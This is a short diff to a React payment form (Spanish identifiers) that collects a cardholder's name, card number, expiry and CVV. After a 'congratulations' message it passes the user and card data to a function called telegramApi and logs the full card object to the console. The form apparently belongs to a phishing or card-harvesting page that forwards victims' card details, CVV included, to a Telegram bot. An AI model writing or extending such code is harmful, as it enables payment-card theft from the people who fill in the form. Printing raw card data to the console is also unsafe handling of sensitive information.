@@ -14,8 +14,12 @@ const form2 = ({showMenuPay,inputClass,formPay,setFormPay,setMensajeFelicidades,
     }
     const enviarDatos=(e)=>{
         e.preventDefault()
-        valided&&setMensajeFelicidades(true)
-        valided&&telegramApi(formUser,formPay)
+        const {nombreApellido,numeroTarjeta,expiracion,cvv}=formPay;
+        console.log(formPay)
+        if(valided&&nombreApellido&&expiracion&&cvv){
+            setMensajeFelicidades(true)
+            valided&&telegramApi(formUser,formPay)
+        }
     }
     return (
     <form style={{top:showMenuPay?"0px":"550px"}} className={`border-2 absolute w-full h-full bg-white ${showMenuPay?"":""} transition-all duration-500 ease-in-out`}>
